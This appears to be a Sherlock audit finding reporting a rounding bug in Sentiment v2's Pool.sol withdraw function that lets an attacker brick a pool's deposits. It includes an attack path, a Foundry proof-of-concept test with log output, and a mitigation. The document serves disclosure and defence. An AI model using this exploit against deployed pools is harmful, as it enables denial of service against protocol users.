Joyous Cream Coyote

Medium

# Base pools can get bricked if depositors pull out

### Summary

In case depositors pull their funds out of the pool, due to rounding, there can be `TotalDepositAssets > 0` while `TotalDepositShares == 0`. This would completely brick the `deposit` function of the pool and the pool would not be functional anymore. This can lead to attackers being able to disable a pool since the start of it's initialization.

### Root Cause

in [`withdraw:350`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L350), the `asset` to `share` conversion is rounded up. This can allow the subtraction in [`withdraw:364`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L364-L365) to reduce the `share` amount to zero while `assets` can stay more than zero.

This state causes every [`convertToShares`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L275-L283) to lead to zero for deposit assets, hence, bricking the [`deposit`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L309-L331) function with the error `Pool_ZeroSharesDeposit`.

### Internal pre-conditions

1. No other depositors should be present in the pool
2. At least one accrual should have happened so that `totalDepositAssets` > `totalDepositShares`

### External pre-conditions

N/A

### Attack Path

1. An attacker sees a pool initialization in the mempool
2. Attacker initializes the pool herself so that the other transaction from the victim fails. (in case it is trying to deposit right after initialization)
3. The attacker deposits some amount in the pool right after initialization
4. In the next block, attacker takes all the deposit assets out and leaves only `1` in
5. Now the `TotalDepositAssets == 1 && TotalDepositShares == 0` holds true
6. The pool is bricked

### Impact

- Since the initialized pools for each address are limited and can be triggered by anyone:
```solidity
poolId = uint256(keccak256(abi.encodePacked(owner, asset, rateModelKey)));
```
Attacker can create all the possible pools for a certain address and brick them all. This stops the target address from creating any more pools. However, new pools can be created from other addresses and be transferred too the victim. This bug can break certain usecases and allow adversaries to target certain users/protocol and launch DoS against them.
- No loss of funds happen since this situation only happens if there are 0 depositors in the pool, which means 0 borrowers.

### PoC

The log outputs for the PoC below:
```solidity
  Total Deposit Assets 0
  Total Deposit Shares 0
  Attacker borrows 0
  ================================
  Total Deposit Assets 200000000000000000000
  Total Deposit Shares 200000000000000000000
  Attacker borrows 0
  ================================
  Total Deposit Assets 200000000000000000000
  Total Deposit Shares 200000000000000000000
  Attacker borrows 10000000000000000000
  ================================
  Total Deposit Assets 200000000000000000000
  Total Deposit Shares 200000000000000000000
  Attacker borrows 10000003992699064570
  ================================
  Total Deposit Assets 200000003992699064570
  Total Deposit Shares 200000000000000000000
  Attacker borrows 0
  ================================
  Total Deposit Assets 1
  Total Deposit Shares 0
  Attacker borrows 0
  ================================
```

Which shows the final `Total Deposit Assets 1` and `Total Deposit Shares 0` which bricks the victim pool.

```solidity
function testCanBrickPool() public {
        address attacker = makeAddr("Attacker");
        address victim = makeAddr("Victim");

        MockERC20 borrowAsset = asset1;
        MockERC20 collateralAsset = asset2;
        uint256 amountOfAsset = 1_000 ether;
        uint256 vicPoolId;
        address attPosition;
        bytes memory data;
        Action memory action;

        /**
        * =============================
        *           SETUP
        * =============================
         */
        {
            // == Minting assets to actors
            borrowAsset.mint(attacker, amountOfAsset);
            collateralAsset.mint(attacker, amountOfAsset);

            borrowAsset.mint(victim, amountOfAsset);
            collateralAsset.mint(victim, amountOfAsset);
            // == Finish minting assets

            // == Making the position
            vm.startPrank(attacker);
            bytes32 salt = bytes32(uint256(98));
            address owner = attacker;
            data = abi.encodePacked(owner, salt);
            (attPosition,) = protocol.portfolioLens().predictAddress(owner, salt);
            action = Action({ op: Operation.NewPosition, data: data });
            positionManager.process(attPosition, action);
            vm.stopPrank();

            vm.startPrank(positionManager.owner());
            positionManager.toggleKnownAsset(address(borrowAsset));
            // positionManager.toggleKnownAsset(address(collateralAsset)); // Already a known asset
            vm.stopPrank();
            // == Finish making the position

            // == Victim making the pool
            // // ==== Setting the rateModel
            address rateModel = address(new LinearRateModel(1e18, 2e18));
            bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
            vm.prank(protocolOwner);
            registry.setRateModel(RATE_MODEL_KEY, rateModel);
            // // ==== Finished Setting the rate model
            vm.startPrank(victim);
            vicPoolId = pool.initializePool(
                victim, // owner
                address(borrowAsset), // asset to use
                1e30, // pool cap
                RATE_MODEL_KEY // rate model key in registry
                );
            // // ==== Setting the LTV
            riskEngine.requestLtvUpdate(vicPoolId, address(collateralAsset), 0.8e18); // Using the same asset to borrow one in this case
            riskEngine.acceptLtvUpdate(vicPoolId, address(collateralAsset));
            // // ==== Finish setting the LTv
            vm.stopPrank();
            // == Finished making the pool

            // == Attacker setting up the position
            vm.startPrank(attacker);
            data = abi.encodePacked(address(collateralAsset));
            action = Action({ op: Operation.AddToken, data: data });
            positionManager.process(
                attPosition,
                action
            );
            collateralAsset.transfer(address(attPosition), amountOfAsset/2);
            vm.stopPrank();
            // == Finish Attacker setting up the position
        }

        /**
        * =============================
        *           EXPLOIT
        * =============================
         */

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        borrowAsset.approve(address(pool), amountOfAsset/5);
        pool.deposit(vicPoolId, amountOfAsset/5, attacker);
        vm.stopPrank();

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        data = abi.encodePacked(vicPoolId, amountOfAsset/100);
        action = Action({ op: Operation.Borrow, data: data });
        positionManager.process(
            attPosition,
            action
        );
        borrowAsset.transfer(attPosition, amountOfAsset/50);
        vm.stopPrank();

        logPoolData(vicPoolId, attPosition);

        vm.warp(block.timestamp + 12);

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        data = abi.encodePacked(vicPoolId, type(uint256).max);
        action = Action({ op: Operation.Repay, data: data });
        positionManager.process(
            attPosition,
            action
        );
        vm.stopPrank(); 

        logPoolData(vicPoolId, attPosition);
        
        vm.startPrank(attacker);
        (,,,,,,,,,uint256 totalDepositAssets,) = pool.poolDataFor(vicPoolId);
        pool.withdraw(vicPoolId, totalDepositAssets - 1, attacker, attacker); // 1 asset remaining with 0 shares, amountOfAsset = 1_000 ether
        vm.stopPrank(); 

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        borrowAsset.approve(address(pool), amountOfAsset/5);
        vm.expectRevert(); // pool is bricked!
        pool.deposit(vicPoolId, amountOfAsset/5, attacker);
        vm.stopPrank();
    }
    function logPoolData(uint256 poolId, address attacker) view public {
        (,,,,,,,,,uint256 totalDepositAssets, uint256 totalDepositShares) = pool.poolDataFor(poolId);
        console2.log("Total Deposit Assets", totalDepositAssets);
        console2.log("Total Deposit Shares", totalDepositShares);
        console2.log("Attacker borrows", pool.getBorrowsOf(poolId, attacker));
        console2.log("================================");
    }
```

### Mitigation

The protocol should check and only allow state transitions that make `assets` or `shares` 0 only if the other one is also 0.